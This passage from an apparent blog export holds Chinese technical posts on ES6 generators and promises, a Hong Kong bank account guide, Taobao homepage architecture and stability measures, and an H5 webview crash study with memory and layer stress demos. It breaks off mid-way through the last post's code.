自定义一个对象的迭代器。 16. GeneratorsGenerator 函数是 ES6 的新特性，它允许一个函数返回的可遍历对象生成多个值。 在使用中你会看到 * 语法和一个新的关键词 yield: 123456789101112function *infiniteNumbers() &#123; var n = 1; while (true)&#123; yield n++; &#125;&#125;var numbers = infiniteNumbers(); // returns an iterable objectnumbers.next(); // &#123; value: 1, done: false &#125;numbers.next(); // &#123; value: 2, done: false &#125;numbers.next(); // &#123; value: 3, done: false &#125; 每次执行 yield 时，返回的值变为迭代器的下一个值。 17. PromisesES6 对 Promise 有了原生的支持，一个 Promise 是一个等待被异步执行的对象，当它执行完成后，其状态会变成 resolved 或者 rejected。 123456789var p = new Promise(function(resolve, reject) &#123; if (/* condition */) &#123; // fulfilled successfully resolve(/* value */); &#125; else &#123; // error, rejected reject(/* reason */); &#125;&#125;); 每一个 Promise 都有一个 .then 方法，这个方法接受两个参数，第一个是处理 resolved 状态的回调，一个是处理 rejected 状态的回调： 12p.then((val) =&gt; console.log("Promise Resolved", val), (err) =&gt; console.log("Promise Rejected", err)); 小结我很少翻译文章，因为我觉得英文是工程师的标配，所以那些还在依托人家翻译吸收新知识的同学，要好好把基础英语学好；） 翻译基本按照原文行文，后面几个小结略有删减和修改，不影响阅读。如解释不当，烦请指出。]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[招行香港一卡通办理和使用]]></title>
    <url>%2Fblog%2F2016%2F07%2F07%2F2016-07-07-hongkong-cmbchina%2F</url>
    <content type="text"><![CDATA[最近办了一张招行香港一卡通，流程比较长，遇到的问题也很多，趁着自己还记得比较清楚，写下来备忘。 这张卡有什么用，这篇豆瓣帖子 可以解决你的疑惑。简单来说，你要把国内的钱放到香港或者国外花，你需要有类似的卡；你要把国外的钱转到国内，你依然需要类似的卡。它的作用就是抹除货币通行差异。没学过经济学和相关知识，以上是我的浅薄理解。 香港一卡通的申请需要准备的东西： 身份证（以及正反复印件） 港澳通行证（以及有头像页复印件），貌似护照也是可以的 招行卡（需要金卡，以及证明复印件） 居住地证明（我用的是暂居证，注意看看有没有过期，暂居证有效期是 1 年） 过程中会让你多次输入密码，这些是香港一卡通的查询密码和转账密码。如果你之前没有 Ukey，还需要办理 Ukey，一个 USB 接口的 U 盾，用于香港招行 PC 客户端登录，20 元。 最后，受理人员会给你一张红色纸张的回单，回单有两个作用： 回单上有受理分行和经办人员信息，可以联系他们查询进度 回单上有网上银行授权码（16 位），记得保存，使用 Ukey 登录客户端时需要使用，作用是关联你的 Ukey 可以跟办理人员说加急处理，处理时间大约一周，卡片办好之后邮寄回来大概三五天，香港银行那边采用的 EMS 邮寄的。 香港一卡通激活1. 激活流程 电话到 95555，[1] 自助语音 -&gt; 输入香港一卡通卡号 -&gt; 查询密码 -&gt; [1] 账户管理 -&gt; [6] 卡片激活 激活过程中会提示你输入账户号，这里不是你的身份证号码，而是港澳通行证号码 激活后需要在 50 天内使用同名账户（也就是你的其他银行卡）转入一笔钱到账户，否则账户处于冻结状态（资金能够转入，但是为冻结状态），同名账户转账入账后自动解冻。 香港一卡通是会收取账户管理费用的，每月大概 15 HKD。 2. 转账解冻 内地账户转账到香港账户，不能转人民币，只能是港币或者美金。首先需要兑换外币，然后转过去。 登录网上银行，点击横排菜单“外汇管理”-“外汇购汇”后会显示您的人民币子账户，前面“操作”下有蓝色的“购汇”两个字，点击”购汇”。提醒：若购汇后需要汇出，建议选择“现汇”； 汇到香港一卡通，选择“外汇管理”-“境外汇款”-“汇到香港一卡通”的界面上进行操作转出，需要注意的是，每次转到香港一卡通都需要 200 人民币的手续费，所以不要傻傻地只转一百两百，这样太不划算了。 转账完成后，第二天账户才会解冻 香港一卡通转账到内地上面已经说了，网页版是没法使用的，需要下载客户端。 去 网页上 右侧的「个人网银专业版」下载 PC 客户端，只能通过客户端操作，并且只支持 windows 系统。我是 Mac 系统，无奈使用 Parallels 虚拟机操作，插入 Ukey 时 Parallels 会提示插入设备指向 Mac 还是虚拟机，毫无疑问选择虚拟机；） 这里会用到「香港一卡通申请」步骤中回单上的授权码（所以，整个环节手机记得多拍照） 登录进去之后，后面就简单了 与在线客服的问答1. 如何获取现汇？ 若您的开户证件为身份证（不包括临时身份证），可以通过网上银行办理购汇，每人每年等值5万美元（含）的结售汇额度。 操作方法：请您登录网上银行，点击横排菜单“外汇管理”-“外汇购汇”后会显示您的人民币子账户，前面“操作”下有蓝色的“购汇”两个字，点击”购汇”。 提醒：若您购汇后需要汇出，建议您选择“现汇”； 2. 如何将现汇转账到香港一卡通？ 您汇到香港一卡通的话，选择“外汇管理”-“境外汇款”-“汇到香港一卡通”的界面上进行操作转出 3. 香港一卡通转到内地一卡通手续费？ 通过香港网银把香港账户港币/美金汇往内地一卡通有两种方式供您选择： 【汇往内地同名招行账户】(1)若以人民币入账:请登陆香港分行网银专业版菜单“银行业务”→“货币兑换”→“香港港币美元兑换内地人民币”操作。该方式不收取手续费，但是会占用您每人每年等值5万美金的结汇额度。 (2)若是以原币种入账，请登陆香港分行网银专业版菜单“银行业务”→“转账汇款”→“至内地港币美元汇款”操作。该种方式会收取每笔11美金或80港币的手续费。 4. 如果未操作同名账户转账，即账户未激活，会有什么问题？ 您好，若您的香港一卡通是通过境内见证网点开户的，您是需要在开户成功后二个月内操作一笔同名账户转账激活账户。若是二个月内没有同名转账记录，账户将被取消。若是二个月内没有同名转账，但有其它资金入帐的话，账户是会被冻结，直到有同名账户转账资金入帐后才能解冻。 5. 香港一卡通账户管理计费情况？ 香港一卡通按月收取账户管理费，管理费的标准为HKD15/月。若您选择收取电子结单，则账户管理费将优惠至HKD8/月。账户开户达到三个完整的日历月份，于第4个日历月份开始，固定每月5日扣收账户管理费，之后固定于每月5日扣收上月管理费；系统自动每月5号扣收，不管是否为香港公众假期。若收取管理费月份向前推算三个日历月份之日均总资产达到等值港币10万则免收客户当月管理费。 6. 香港一卡通账户欠费会有什么问题？ 若您香港一卡通活期账户内没有资金结余，我行将无法正常扣收账户管理费，且会在系统内记录欠费，等待您活期账户有资金时再扣除有关费用并清除相应欠费。如果欠费超过120天，香港分行将会进行批量关户。 小结遇到疑问两个联系入口： 95555 电话联系客服，需要输入一堆信息，我觉得效率不如下面方式高 进入 官网，点击右上角在线客服，很靠谱 👍]]></content>
      <categories>
        <category>随笔</category>
        <category>在路上</category>
      </categories>
      <tags>
        <tag>招行香港一卡通</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[谈一谈越来越难做的前端]]></title>
    <url>%2Fblog%2F2016%2F06%2F13%2F2016-06-13-talk-about-front-end%2F</url>
    <content type="text"><![CDATA[我接触前端的时间不长也不短，12 年入门，14 年初在百度实习，14 中正式参加工作，掐指一算 4 年整。然而这四年间前端的变化已经让很多人摸不着头脑。 昨天还发了一条状态，调侃 jQuery 是一个坚韧的社区，有人留言问我为什么这么说。 记得刚入前端这个坑时，jQuery 异常火爆，图书馆的相关书籍俯拾皆是，博客园上的文章介绍多若繁星，jQuery 插件铺天盖地，可谓盛况空前。然而，随着多端设备的兴起和界面需求的不断强盛，jQuery 几乎已经不能胜任日常开发了，时常会在加载缓慢的页面上看到一堆性能低下的 jQuery 组件，被胡乱地拼凑到一起，那场面，就像进入了一间很久没有打扫过的屋子，弥散着臭味和灰尘。 前端是一个喜欢发明问题和解决问题的物种，它干着杂乱无章的活儿，却又在用户的视角前凸显自己整洁。从缤纷的组件，到工程化、组件化，再到模块化，然后回归到语言本身的进化，紧接着又是一轮新的变革。技术在变，社区也在变，社区只是技术演变的一个容器，技术的终点是回归业务。 业务中出来的问题太多，而解决问题的方案则更多，每隔一小段时间前端就会突然蹦出几个新鲜的名词。把单词拆开来看每个字母都认识，但拼凑到一块儿，就只能眼睛瞪鼻子了。不管我们使出多少气力，投入多少时间，新的技术总是学不完，也学不通透，学透了却发现没有实践的场景。于是越来越多前端开始彷徨，“我是不是跑偏了？”，“这玩意儿要不要学？”，“这技术刚听说怎么就被淘汰了？”，“怎么出去旅个游回来感觉落后了半个世纪？”。 对，这就是前端圈子的现状。五年前，你可以说搞前端的很肤浅，而今天——你依然可以这么说🙈——前端的知识体量上升了一个台阶，但我们做的事情依然没变，切！页！面！只是我们发明了更多更丰富的切页面工具，让运营帮我们切，让程序帮我们切，让机器帮我们切。 在切页面的同时，我们的职能也发生了一些改变，我们需要掌握更多的工具和更多的语言，从客户端延伸到了服务端甚至运维层面，从前端资源演变成了产品的主导者，带着运营和产品经理玩游戏，我们甚至可以提供玩法，他们跳进来玩耍。 前端这几年变得丰满了许多，可以深入的方向更多了。无线、Node、类 React、模块化、工程化等等，开始出现了「前端领域」这个概念，它不再是笼统的 HTML/CSS/JavaScript 杂烩，每个领域都有专家，每个领域都有自己的研究方法。所以前端也出现了很多的机会，以及更多的趣味性——事实上，前端那种所见即所得的开发，本身就是一种趣味。 也有很多人不断地为前端圈地盘，在知识边界上开疆拓土，如 Docker、HTTPS、自动化、运维等等，甚至直接跨端跨界跨语言与其他方向擦出奇妙的火花。 前端演变很快很剧烈，找到自己的一席之地很重要。 那么文章的最后，抛出一串问题，在漫漫前端的发展史上，你经历过哪些？你学到了哪些？你属于哪个层级？你将要去哪里？]]></content>
      <categories>
        <category>前端杂烩</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>前端</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[聊一聊淘宝首页和它背后的一套]]></title>
    <url>%2Fblog%2F2016%2F06%2F02%2F2016-06-02-thing-about-taobao-homepage%2F</url>
    <content type="text"><![CDATA[从 14 年双十二结束开始接手淘宝首页，到如今差不多 1 年半时间，不久前完成了首页相关工作的交接。期间经历了两次改版和一次从 PHP 到 Node 的迁移，还是颇有感受，下面给大家分享下。 文章好像有点长，列个大纲会比较好： 一、相关背景介绍二、淘宝首页的整理变迁 1. PHP 下的淘宝首页 2. PHP 到 Node 的变迁 3. Node，不一样的模式三、淘宝首页的性能优化 1. 页面渲染逻辑 2. 一起来看看淘宝首页的个性化 3. 淘宝首页性能优化实践四、淘宝首页的稳定性保障 1. 兜底容灾机制 2. 监控预警机制 3. 上线前的自动化检测五、淘宝首页的敏捷措施 1. 健康检查 2. 接口 Hub 3. 快捷通道六、小结 一、相关背景介绍淘宝首页是淘宝的门面，承载着几乎淘系所有业务的入口，流量很大，量级单位为亿。近几年无线端崛起，业务重点开始向无线终端偏移（目前不能叫偏移，基本以无线为主了），所以淘宝 PC 端首页的流量也有削减，不过即便如此，它的日均 PV 依然相当高。 淘宝首页一向是内部平台和技术的试验田，它一直在变化着。最新的框架和系统都会找淘宝首页试点，可以试想下，如果某一项需要推动的升级或者优化措施在淘宝首页已经上线，并且拿到了良好的数据和稳定性，其他业务还有什么理由不去尝试和更迭呢？同时，去年一年身在淘宝前端的技术架构组，自然而然也会主动去 push 一些实验性的内容到业务上。 淘系的站点页面包括首页、其他频道页和活动页等，这些页面并不都由淘宝前端一行一行的代码码出来，业务如此之多，这种玩法即便人数 double 也忙不过来。事实上，大多数页面都是依托内部的搭建平台——运营或者前端通过模块搭建的方式——构建的，而前端 focus 的重点在于搭建平台的建设自身以及模块的通用性和复用率的保障，当然，还有一些工程化的东西。 使用搭建平台搭建的页面，前端只需要考虑组成页面的原子模块的开发，整体的渲染由搭建平台提供的统一脚本全权负责。而在淘宝首页上，考虑到页面模块数量巨多，加上还有少量跨部门、跨团队的沟通，渲染模型略微不同。 二、淘宝首页的整体变迁背景中提到，淘宝首页依托于内部搭建平台，它的变迁自然也是跟着搭建系统的变化而变化的。 1. PHP 下的淘宝首页接手淘宝首页不久，便遇到了一年一度的改版，那时它还运行在 PHP 环境中。这里需要说明的是，淘宝首页的所有代码完全由前端掌控，前端不会直接跟数据库打交道，其数据来源分为两部分。 数据来源 一是 运营填写的数据。 采用前端挖坑的形式，预留坑位让运营获取填写数据，如（伪代码）： 1234567&lt;?php $info = Person('name:String:姓名,age:Number:年龄', '个人信息坑位填写');?&gt;&lt;div&gt;&lt;?php $info.forEach(index) &#123; ?&gt; Name: &lt;?= info[index].name ?&gt;, Age: &lt;?= info[index].age ?&gt;&lt;?php &#125; ?&gt;&lt;/div&gt; 上面的代码会产生一份 PHP 的模板和 info 字段对应的表单坑位，这个过程简称「挖坑」。 运营填写这些坑位就会产生这份 PHP 模板对应的数据，最后渲染出来就是一个完整的 HTML 片段（实时性渲染）。 123.├── data.json # 运营数据的来源└── index.php # 装载运营数据的 PHP 模板 旧版搭建系统中就是通过这种方式构造一个子模块。我描述得十分简单，但作为一个平台它需要考虑的东西还有很多很多的，比如数据顺序的控制、定时发布、回滚机制、过滤机制、筛选机制、数据的同步、数据的更新、版本控制、权限控制、其他系统的引用等等。 二是 后端或者个性化平台提供的数据。 不同的业务有不同的诉求。一些业务有自己的后端，他们要求使用自己业务产出的数据；有的业务希望用户看到的内容不一样，千人千面，期望接入算法；一些业务跟卖家直接打交道，期望使用招商数据；而有些业务期望采用运营从数据池筛选出来的数据…总之，淘宝首页需要对接形形色色的系统，接口繁多。后面会提到对动态数据源的整合。 并且这些系统对应的域名是不一样的，JSONP 格式自然也就成了首选。但一些特殊的系统，比如广告，它的渲染并不是一个简单的 JSONP 请求，可能它还要干预整个广告的渲染流程，比如加载他们的 JS，把渲染的控制权交过去。 页面的架构 上面介绍了数据的来源和子模块的结构，那么整个页面又是如何构成的呢？模块的搭建分为两种，一种是可视化搭建，运营或者前端可以将开发好的模块（或者模块库中选取的模块）拖拽到容器内，形成一个页面， 当然，上图也只是一个模型，作为一个系统需要考虑的问题还有很多很多，如页面的布局、多终端适配、模块的临时隐藏、位置调整、皮肤选择、模块的复制等等。 也可以通过如下源码搭建的方式（伪代码）： 1234567&lt;body&gt; &lt;?= loadModule(Mod1ID) ?&gt; &lt;?= loadModule(Mod2ID) ?&gt; &lt;?= loadModule(Mod3ID, 'lazyload') ?&gt; &lt;?= loadModule(Mod4ID, 'lazyload') ?&gt; &lt;?= loadModule(Mod5ID, 'lazyload') ?&gt;&lt;/body&gt; 通过模块 id 将模块引入，并且添加一些类似 lazyload 的标记，方便控制渲染节奏和数据入口。源码搭建和模块搭建的区别在于，前者更易于控制模块的结构以及模块的渲染顺序。 动态数据源 首页面对一大堆接口和平台，对接几十个业务方，接口是个很大的问题，由于后台系统的差异，基本没有办法统一数据源的格式，一旦运营哪天心血来潮要换一个他自己觉得用的更爽的或者数据更好的系统，前后端估计又得沟通和对接几次。所以出现了下面这张图： 平台具备数据源接入的能力，也就是说我们挖的坑不仅仅可以让运营填数据，还可以从各种数据源中直接导入数据，当然，这里需要进行一次数据字段的映射转换。后端提供的接口是这样的： 1234567&#123; "data": [&#123; "item_name": "name", "item_url": "http://xxx", "item_pic": "http://xxx" &#125;]&#125; 前端约定的接口形式是: 123456&#123; "info": [&#123; "name": "name", "url": "http://xxx" &#125;]&#125; 那么系统必须提供这种映射的绑定策略： 12info/name -&gt; data/item_nameinfo/url -&gt; data/item_url 绑定之后，数据既可以同步输出，也可以异步输出，这些都是平台提供的能力。这个方案基本上解决了后端系统/接口变化的问题，并且减少了前后端之间的沟通成本。 不过这里需要注意的是，虽然页面上的接口都通过平台统一梳理了一次，这也意味着，页面所有的请求会先流经平台，然后分发到各个后端，平台的抗压能力要求很高。 2. PHP 到 Node 的变迁淘宝首页日均请求的这个量级，不可能是十几二十台台服务器抗得住的，支撑它必须有一个服务集群。 每一个 CDN 节点上都具备 PHP 渲染的能力，当页面发布时，我们把该页面所有的模块和数据同步到全部 CDN 节点上，基本模式大概就是如此了。看起来还挺不错，但是经过一段时间的运维，很多安全、性能问题都慢慢浮现出来了： 性能问题。 每个 PHP 页面包含多个子模块，而子模块也有可能引用了其他的子模块，PHP 的 include 操作是存在消耗的，每一次引用都是一次磁盘 IO，一个渲染节点上跑了成千上万个类似淘宝首页的 PHP 页面，并发一高其效率可想而知。 // @邦彦 同学补充：php 的 include 操作是存在消耗，但是加载、执行的过程预热后，字节码直接进缓存，并不存在频繁磁盘 io 的情况。cdn php 性能差的问题主要是两个：1. php 版本过旧，5.4 和 7 的性能相差不只几倍；2. fast-cgi 模式在高并发的场景下和 node 相比没有任何优势。 推送机制问题。 文件同步（图中的 sync 动作）是一种比较恶心的机制，首先，时间上没法控制，一个文件同步到所有的节点，快则几秒钟，慢的话耗时会超过一两分钟；并且同步过程还有可能失败，健康检测的成本也是相当高的。发布比较紧凑时，需要同步的文件也很多，很容易造成队列堆积，加剧同步差的体验。 实时性强需求问题。 文件在推送之前，还可能经过一些前置系统，发布链路越长，线上生效时间越慢，慢的时候大约五分钟才生效，这样的延时对于实时性要求很高（如秒杀）的需求来说是完全不能接受的。 当然，还有很多其他问题，如运维成本增高、安全风险增高、PHP 资深人才储备不足等等。所以 PHP 渲染容器的命运，就是，被干掉。 上图改变了下玩法，服务集群为 Cache CDN，它只有静态文件处理能力，没有 PHP/Node 的渲染能力，所以处理效率高，性能也好，抗压能力相当强，并且扛不住的时候还可以花钱买服务，拓展 Cache 集群。 用户访问时，Nginx 转到 Cache CDN，如果命中缓存则直接返回，没有命中便回源到源站服务器。源站服务器是具备模块渲染能力的 Node 服务，它可以做很多事情： 控制 Cache 响应头，通过 max-age 和 s-maxage 控制页面在客户端的缓存时间以及在 Cache 上的缓存时间，这个缓存时间可以根据需求随时做调整，比如大促的时候调长一些 控制内外网环境，和 AB 测试状态 融合前端相关的工具链，比如检测、压缩、过滤等等 它的优势有很多，这里不一一列举了。这个模式中还添加了一层容灾，源站服务器每隔一段时间将数据推送到于 Cache 同机房的备份服务器，一旦源站挂了，还能够自动容灾到备份数据上。 模式的变化不仅在运维上有了突破，CDN 被攻击时的安全风险也低了很多，同时也省却了 sync 所需的各种检测机制，每年节约成本也是百万以上，优势还是相当明显。 3. Node，不一样的模式上面 PHP 模块中，我们只说了 HTML 和数据部分，用心的读者应该已经发现，CSS 和 JS 这些静态资源都没提到，那页面是如何渲染的呢？ 旧版 PHP 页面中，我们是直接引入了一个 CSS 和一个 JS，淘宝这边采用的是 git 版本迭代发布，这些静态资源都是直接放在一个 git 仓库中。也就是这样： 1234567891011&lt;head&gt; &lt;link rel="stylesheet" href="//cdn/@VERSION@/index.css"&gt; &lt;script src="//cdn/@VERSION@/index.js"&gt;&lt;/script&gt;&lt;/head&gt;&lt;body&gt; &lt;?= loadModule(Mod1ID) ?&gt; &lt;?= loadModule(Mod2ID) ?&gt; &lt;?= loadModule(Mod3ID, 'lazyload') ?&gt; &lt;?= loadModule(Mod4ID, 'lazyload') ?&gt; &lt;?= loadModule(Mod5ID, 'lazyload') ?&gt;&lt;/body&gt; 每次发布完 git 文件，再修改 PHP 的版本号，然后发布 PHP 代码。当然，也做了相关的优化，比如发布 git 时自动更新版本号等。 而新版搭建平台的页面渲染模式与 PHP 的模式不太一样。 一个模块的 CSS/JS 和模板放在一起，CSS/JS 与页面其他模块的静态资源是相互独立的，目的就是希望单个模块也能够完整的跑起来，更加利于模块的复用。 而模块的挖坑，也从模板中独立了出来，采用 JSON Schema 的形式定义数据格式， 12345.├── index.css # 模块样式├── index.js # 模块渲染脚本├── schema.json # schema 配置└── index.xtpl # 模块的模板 搭建平台通过这个 JSON Schema 解析成 图一 的坑位。那么一个模块的渲染就变成了 index.xtpl 和挖坑数据之间的拼装了。 模块之间相互独立隔离，所以会存在一定程度的冗余，不过模块解偶带来的收益要比这点冗余要多得多。事实上，我们是通过一个仓库去管理单个模块的。页面的渲染就比较简单了，源站 Node 容器会将所有的 index.xtpl 合并成一个 page.xtpl，为减少页面请求，css 和 js 也会 combo 成一个文件，如上图所示的 http://cdn/??mod1.css,mod2.css,mod3.css。 任何模块的更新，页面都会有感知，下次进入系统时，就会提示是否需要升级模块和页面。这里内容比较多，我不细说，感兴趣的可以找我 私聊。 三、淘宝首页的性能优化首页模块众多，如果一口气吐出来，DOM 数量必然超过 4k 个，其结果就是首屏时间极长。按照 TMS 的开发规范，每个 TMS 模块都包含一个 index.js 和 index.css，最后展示出来两个 combo 的 js 和 css。首页加载的时候也不会一口气执行所有 index.js，否则刚开始页面阻塞会十分严重。 页面的渲染逻辑 首页框架的加载逻辑，大致上图所示： 遍历所有 TMS 模块（包含一个 J_Module 的钩子） 部分 TMS 模块无 JS 内容，但是加载了一个 index.js，为模块添加 tb-pass 的 class，用于跳过该模块 JS 的执行 将页面分为两块，首屏为一块，非首屏整体为第二块，先将首屏模块加入到懒加载监控 待首屏模块加载完成，或者用户处理了页面交互时（滚动、鼠标移动等），将非首屏模块加入到懒加载监控 处理一些特殊模块，它们会在进入视窗之前几百像素就开始加载 监控滚动，按照以上逻辑，渲染模块 部分模块即便是被执行了，也不一定渲染出来，因为它的优先级不高，在模块内部加了事件监听，比如等到 mouseover/onload 事件触发的时候再渲染这些内容。 之前写过性能优化相关的文章，复制就没必要了，直接贴地址： 《一起来看看淘宝首页的个性化》 《淘宝首页性能优化实践》 代码的性能优化是一个精细活，如果你要在一个庞大的未经优化的页面上做性能优化，可能会面临一次重构代码。 上面的文章提到的是页面内部的细节优化，但是在开发流程中做的规范化、标准化，以及线上访问通路中的各个环节优化还没有提及。这一块内容可能有点跑题，就不多说了。 四、淘宝首页的稳定性保障在大流量下，任何小问题都会被放大成大问题，所以开发环节遇到的任何偶发性问题都需要引起重视。不过很多偶发性问题在我们的测试环境中是找不到的，比如与地域相关的问题（如上海的某个 CDN 节点挂了），用户属性问题（如 nickname 最后一个为字母 s 的用户页面天窗），浏览器插件问题，运营商广告注入问题等等。 难以在上线之前把所有问题考虑周全，但是有两点是必须做好的：兜底容灾 + 监控预警。 1. 兜底容灾机制兜底容灾有两个层面的考虑： 异步接口请求错误，包括接口数据格式错误，接口请求超时等 同步渲染，源站页面渲染出错 异步接口请求，主要涉及到的是后台系统，对接系统较多，各个系统的稳定性和抗压能力各不相同，这方面的保障有多种方案，下面是最常见的： 每次数据请求都缓存到本地，并且为每个接口都提供一个硬兜底。还有一种方案是「重试」，请求一次不成功那就请求第二次。这方面的讨论具体可以看看之前写的这篇文章：《大流量的下兜底容灾方案》。 对于同步渲染，它只需要页面模板和同步数据，两者中任一种存在错误，源站都会报错，此时回源返回的内容就是一个 error 页面，状态码为 5xx。这个错误不一定是开发者造成的，有可能是系统链路出现同步异常或者断路问题。针对这种问题，我给淘宝首页做了一个镜像页： 一旦源站任何异常，Nginx 都会转到与 Cache CDN 同机房的首页镜像上去，这个镜像内容就是淘宝首页的 HTML 备份源码。 2. 监控预警机制可以先看看之前写的这篇文章：《前端代码异常日志收集与监控》，介绍了一些监控方法。 监控也有两个层面： 模块级别的监控，接口请求布点、模块天窗检测等 页面的监控，在页面上添加特殊标记，定时回归所有 CDN 节点，查看特殊标记是否存在 模块层面的监控，内容还是相当多的，监控的点越多越详细，到最后定位问题的效率就会越高，比如在一个稍微复杂的模块上，我会埋下这些监控： 接口请求格式错误、请求失败、请求超时，至少三个埋点 硬兜底数据请求失败埋点 模块 5s 内没有渲染完成统计埋点 模块内链接和图片黑白名单匹配埋点 其中部分监控还会自动处理明确的错误，比如 https 页面下出现了 http 的图片，会立即自动处理掉这些问题。 3. 上线前的自动化检测这属于淘宝整个工程化环境的一部分，前端自动化测试。一般会在上线之前处理这些问题： 检测 HTML 是否符合规范 检测 https 升级情况 检测链接合法性 检测静态资源合法性 检测 JavaScript 报错 检测页面加载时是否有弹出框 检测页面是否调用 console.* 页面 JS 内存记录 当然，也可以自己添加测试用例，比如检测接口数据格式、模块天窗问题等。自动化检测也可以设定定时回归，还是比较有保障的。 五、淘宝首页的敏捷措施1. 健康检查页面模块众多，为了能够追踪页面上每一个小点的变化，我在请求、渲染的每一个环节都做了详细的统计，如下图所示： 一旦接口请求失败，或者接口走了容灾逻辑，或者模块渲染超过 5s，控制台都会有黄色警报，当然此时，也已经向服务器发送了警报统计。 2. 接口 Hub接口 Hub 是对数据请求的管理工具，如下图所示： 页面很多模块的渲染都需要一个以上的数据源，一旦运营反馈页面渲染数据异常，可以直接通过 Hub 找到数据，加速 Bug 定位效率。同时 Hub 也可以用来切换环境，将一个接口的请求切换到日常或者预发环境的接口之中，它是调试的利器。 3. 快捷通道我在页面脚本执行前后都放了一个快捷操作通道，一旦遇到紧急线上问题，比如样式错乱溢出、接口报错导致天窗等，可以通过快捷通道直接修改页面的 CSS 和 JS，两分钟内上线。 不过这类通道只适合紧急问题的修复，毕竟随意插入 JS 代码是存在很大风险的。 六、小结写的好像有点虎头蛇尾（码字和画图都太累），还有很多方面没有延伸拓展开。希望以上可以让你对淘宝首页有一个基本的认识。]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>淘宝首页</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[H5 Crash 研究]]></title>
    <url>%2Fblog%2F2016%2F05%2F30%2F2016-05-30-h5-crash-research%2F</url>
    <content type="text"><![CDATA[我们知道，支撑页面在 webview 上良好运转的前提是具备一个高效并且稳定的 webview 容器，而容器的高效稳定不仅仅由容器提供方来保障，也需要容器使用者遵守一些基本准则，否则就有可能出现页面 Crash 的情况，这些准则是什么？什么样的上层代码会引起容器异常退出？这是本文需要阐述的内容。 H5 Crash 问题概况下图是 H5 Crash 的大致流程图： 由于前端没办法捕捉到页面 Crash 的状态和堆栈，但是 H5 页面上发生的错误会传递到 Java 和更底层的 Native 直到容器异常退出，在退出的那一刻，容器会将堆栈写入到日志中，当下次打开容器时（也可能是定时上报）就会上报这些堆栈信息。 H5 Crash 原因初探测试代码 仓库地址： 12git clone //github.com/barretlee/h5crash.git;cd demo; 注意： 代码需要在 Webview 容器中测试，PC 浏览器下不会出现异常。 H5 Crash 的原因不太明显，但是从经验上判断和摸索，大致归类为以下三种： 1. 内存问题 测试方法：使用闭包，不断增加内存量，看看增加到哪个区间大小， webview 容器会出现异常 测试地址：http://rawgit.com/barretlee/h5crash/master/demo/crash-memory.html（微信、微博或者其他客户端打开该页面的用户，可以点进去测试下，选择 100M 内存，不出意外，你的客户端会闪退。） 1234567891011121314151617181920212223242526272829&lt;script&gt;var Closure = function() &#123; var _cache = []; var cache = 0; var add = function(size) &#123; cache += size; size = size * 1024 * 1024; _cache.push(new Array(size).join('x')); refresh(); &#125;; var refresh = function() &#123; r.innerHTML = '内存消耗： ' + cache + 'M'; &#125;; return &#123; cache: cache + 'M', add: add, refresh: refresh &#125;&#125;;var closure = Closure();&lt;/script&gt;&lt;button onclick="closure.add(1)"&gt;增加 1M 内存消耗&lt;/button&gt;&lt;button onclick="closure.add(10)"&gt;增加 10M 内存消耗&lt;/button&gt;&lt;button onclick="closure.add(20)"&gt;增加 20M 内存消耗&lt;/button&gt;&lt;button onclick="closure.add(50)"&gt;增加 50M 内存消耗&lt;/button&gt;&lt;button onclick="closure.add(100)"&gt;增加 100M 内存消耗&lt;/button&gt;&lt;div id="r"&gt;内存消耗：0 M&lt;/div&gt; 存在的干扰：这种测试存在比较多的干扰，比如设备类型、系统类型（iOS/Android)、和设备内存运行状态等。 2. Layers 数问题 Layers 数的获取比较麻烦，Chrome Driver 没有提供该数据的接口，目前也没有比较好的办法拿到这个数据。 测试方法：通过不同的方式创建层，观察页面的 Crash 情况 测试地址：http://rawgit.com/barretlee/h5crash/master/demo/crash-layer.html 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273&lt;style&gt;.transform &#123; transform: translateZ(0);&#125;.animation &#123; width:100px; height:100px; background:red; position:relative; animation:move 5s infinite;&#125;@keyframes move &#123; from &#123;left:0px;&#125; to &#123;left:200px;&#125;&#125;&lt;/style&gt;&lt;script&gt;var Layer = function() &#123; function getType() &#123; return document.querySelector('input:checked').value; &#125;; return &#123; createOne: function(index) &#123; var div = document.createElement('div'); div.appendChild(document.createTextNode(index)); switch(getType()) &#123; case 'opacity': div.style.cssText = "opacity:" + (index / 1000); break; case 'transform': div.className = 'transform'; break; case 'animation': div.className = 'animation'; break; case 'zindex': div.style.cssText = "position:relative; z-index:" + index; break; &#125; document.body.appendChild(div); &#125;, create: function(num) &#123; [].slice.call(document.querySelectorAll('div')).forEach(function(item) &#123; item.parentNode &amp;&amp; item.parentNode.removeChild(item); &#125;); while(num--) &#123; this.createOne(num); &#125; &#125; &#125;&#125;;var layer = Layer();&lt;/script&gt;&lt;strong&gt;层类型: &lt;/strong&gt;&lt;ul&gt; &lt;li&gt;&lt;label&gt;&lt;input type="radio" checked name="type" value="opacity"&gt; &lt;span&gt;通过 opacity 创建层&lt;/span&gt;&lt;/label&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;&lt;input type="radio" name="type" value="transform"&gt; &lt;span&gt;通过 transforms 创建层&lt;/span&gt;&lt;/label&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;&lt;input type="radio" name="type" value="animation"&gt; &lt;span&gt;通过 animation 创建层&lt;/span&gt;&lt;/label&gt;&lt;/li&gt; &lt;li&gt;&lt;label&gt;&lt;input type="radio" name="type" value="zindex"&gt; &lt;span&gt;通过绝对定位分层&lt;/span&gt;&lt;/label&gt;&lt;/li&gt;&lt;/ul&gt;&lt;button onclick="layer.create(1)"&gt;创建 1 个层&lt;/button&gt;&lt;button onclick="layer.create(10)"&gt;创建 10 个层&lt;/button&gt;&lt;button onclick="layer.create(20)"&gt;创建 20 个层&lt;/button&gt;&lt;button onclick="layer.create(50)"&gt;创建 50 个层&lt;/button&gt;&lt;button onclick="layer.create(100)"&gt;创建 100 个层&lt;/button&gt;&lt;button onclick="layer.create(200)"&gt;创建 200 个层&lt;/button&gt;&lt;button onclick="layer.create(500)"&gt;创建 500 个层&lt;/button&gt;&lt;button onclick="layer.create(1000)"&gt;创建 1000 个层&lt;/button&gt;&lt;button 